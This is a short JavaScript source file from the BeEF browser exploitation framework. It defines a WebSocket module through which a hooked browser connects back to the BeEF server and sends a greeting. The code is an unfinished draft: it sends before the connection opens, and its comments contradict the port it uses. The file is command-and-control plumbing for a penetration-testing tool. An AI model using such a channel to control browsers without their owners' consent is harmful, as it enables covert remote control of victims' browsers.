//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//

//beef.websocket.socket.send(take answer to server beef)
/*New browser init call this */
beef.websocket = {

    socket: null,
    /*websocket send Helo to beef server and start async communication*/
    start:function(){
        console.log("started ws \n")

           /*server is always on ws.beefServer:6666*/
        var webSocketServer=beef.net.host; /*beefHost*/
        console.log(webSocketServer);
        var webSocketPort=11989;
          if(beef.browser.isFF()){
              this.socket = new MozWebSocket("ws://"+webSocketServer+":"+webSocketPort+"/");
          }else{
               this.socket = new WebSocket("ws://"+webSocketServer+":"+webSocketPort+"/");
          }
           /*so the server is just up we need send helo id @todo insert browser ID where can i get them?*/

    this.socket.send("Helo"+"myid00");
    console.log("Connected and Helo");
    }


}   /*end websocket*/